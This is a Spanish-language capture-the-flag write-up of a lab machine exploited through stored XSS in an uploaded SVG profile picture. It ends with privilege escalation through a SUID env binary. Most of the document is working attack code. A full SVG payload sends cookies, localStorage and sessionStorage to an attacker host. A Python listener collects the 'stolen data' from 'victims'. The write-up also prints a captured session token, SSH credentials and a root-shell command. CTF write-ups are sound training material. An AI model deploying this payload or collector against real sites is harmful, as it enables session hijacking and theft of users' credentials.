## Reconocimiento:

Puerto 22 : SSH

Puerto 5000 : HTTP

En la web hay una página hecha en Python, que usualmente utiliza flask. Deduzco que la máquina es de robo de Cookies.

Nos creamos un usuario y dentro hay un panel para subir la foto de perfil, lo interesante es que acepta formato SVG.

Inspeccionando el código encuentro:

```python
<script>
        setTimeout(() => {
            const messages = document.querySelectorAll('.flash-message');
            messages.forEach(msg => {
                msg.style.animation = 'slideOut 0.3s ease-out forwards';
                setTimeout(() => msg.remove(), 300);
            });
        }, 5000);
        
        if (!localStorage.getItem('api_token')) {
            localStorage.setItem('api_token', 'sk-live-28a7f9e2b3c1d4a5e6f789012345abcdef');
            localStorage.setItem('user_email', 'diseo@socialhub.com');
            localStorage.setItem('user_role', 'premium_user');
            localStorage.setItem('last_login', new Date().toISOString());
        }
        
    </script>
```

Acepta SVG sin sanitización y almacena API tokens, asi que la vulnerabilidad aquí es un **Strored XSS vía SVG** 

Para el payload lo encuentro en el writeup de Diseo junto con el script para montar el servidor. Primero creo el svg y lo subo:

```python
<svg xmlns="http://www.w3.org/2000/svg">
<script>
<![CDATA[
  // ENFOQUE: Robar lo que sea que dé acceso

  var attacker = "http://<IP_ATTACKER>:8000";

  // 1. Intentar document.cookie (normal)
  if (document.cookie && document.cookie.length > 10) {
    var img1 = new Image();
    img1.src = attacker + "/?method=document_cookie&data=" + encodeURIComponent(document.cookie);
  }

  // 2. Intentar localStorage (como vimos en el HTML)
  if (localStorage && localStorage.length > 0) {
    var lsData = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      lsData[key] = localStorage.getItem(key);
    }
    var img2 = new Image();
    img2.src = attacker + "/?method=localStorage&data=" + encodeURIComponent(JSON.stringify(lsData));
  }

  // 3. Intentar sessionStorage
  if (sessionStorage && sessionStorage.length > 0) {
    var ssData = {};
    for (var i = 0; i < sessionStorage.length; i++) {
      var key = sessionStorage.key(i);
      ssData[key] = sessionStorage.getItem(key);
    }
    var img3 = new Image();
    img3.src = attacker + "/?method=sessionStorage&data=" + encodeURIComponent(JSON.stringify(ssData));
  }

  // 4. Intentar hacer petición AUTENTICADA y capturar respuesta
  setTimeout(function() {
    fetch("/profile", {
      method: "GET",
      credentials: "include"  // Esto envía cookies automáticamente
    })
    .then(response => {
      // Obtener cookies de los headers de respuesta
      var cookiesFromHeaders = response.headers.get('set-cookie') || 'no-set-cookie-header';

      // Enviar info
      var img4 = new Image();
      img4.src = attacker + "/?method=fetch_response&cookies=" + encodeURIComponent(cookiesFromHeaders) +
                 "&url=/profile&status=" + response.status;
    })
    .catch(e => {
      var img5 = new Image();
      img5.src = attacker + "/?method=fetch_error&error=" + encodeURIComponent(e.message);
    });
  }, 1000);

  // 5. Intentar acceder a document.cookie via iframe (bypass HttpOnly)
  setTimeout(function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = '/';  // Página que podría setear cookies
    document.body.appendChild(iframe);

    setTimeout(function() {
      try {
        var iframeCookies = iframe.contentDocument.cookie;
        var img6 = new Image();
        img6.src = attacker + "/?method=iframe&cookies=" + encodeURIComponent(iframeCookies);
      } catch(e) {
        // Cross-origin error esperado
      }
    }, 2000);
  }, 500);

  console.log("SVG payload ejecutado - múltiples métodos activados");
]]>
</script>
<rect width="200" height="200" fill="orange"/>
<text x="100" y="100" fill="white">TEST</text>
</svg>
```

Luego creo el server y lo ejecuto:

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import datetime
import html

class XSSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        query = parse_qs(parsed.query)

        print("\n" + "="*60)
        print(f"[{datetime.datetime.now()}] Nueva víctima!")
        print("="*60)

        # Mostrar datos básicos
        print(f"User-Agent: {self.headers.get('User-Agent')}")
        print(f"IP: {self.client_address[0]}")

        # Procesar datos exfiltrados
        if 'data' in query:
            try:
                data = json.loads(query['data'][0])
                print("\n[+] DATOS ROBADOS:")
                print("-" * 40)

                if 'cookies' in data and data['cookies']:
                    print(f"Cookies: {data['cookies']}")

                if 'localStorage' in data:
                    print("\n[+] localStorage:")
                    for key, value in data['localStorage'].items():
                        print(f"  {key}: {value}")
                        # Buscar flags automáticamente
                        if 'flag' in str(value).lower():
                            print(f"  ⚑ POSIBLE FLAG ENCONTRADA en {key}: {value}")

                if 'sessionStorage' in data:
                    print("\n[+] sessionStorage:")
                    for key, value in data['sessionStorage'].items():
                        print(f"  {key}: {value}")

                if 'csrfToken' in data:
                    print(f"\nCSRF Token: {data['csrfToken']}")

                print(f"\nURL: {data.get('url', 'N/A')}")
                print(f"User-Agent: {data.get('userAgent', 'N/A')}")

            except Exception as e:
                print(f"Error procesando datos: {e}")
                print(f"Query raw: {query}")

        elif 'c' in query:
            print(f"\n[+] Cookie recibida: {query['c'][0]}")

        elif 'flags' in query:
            print(f"\n[+] FLAGS ENCONTRADAS: {query['flags'][0]}")

        # Enviar respuesta vacía (1x1 pixel transparente)
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

        # 1x1 pixel PNG transparente
        self.wfile.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x00\r\n\xd5\xa2\x00\x00\x00\x00IEND\xaeB`\x82')

    def log_message(self, format, *args):
        # Silenciar logs normales
        pass

def run_server(port=8000):
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, XSSHandler)

    print(f"✅ Servidor XSS escuchando en http://0.0.0.0:{port}")
    print(f"📡 Accesible desde: http://TU_IP:{port}")
    print("🕵️  Esperando víctimas...")
    print("-" * 60)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Servidor detenido")
        httpd.server_close()

if __name__ == '__main__':
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    run_server(port)
```

Funciona y obtenemos el token:

```
token = eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aTP3JA.xGLiiwj1uwHMRi-3Kd6szil-HVA
```

Lo cambiamos en la web y obtenemos el panel de administrador con las credenciales ssh:

```
User : hijacking
Pass : cookiedelicious
```

## Escalada

```bash
find / -type f -perm -4000 -ls 2>/dev/null
# Info:
/usr/bin/env
```

Encuentro el exploit en GTFO bins:

```bash
env /bin/bash -p
```

Listo.
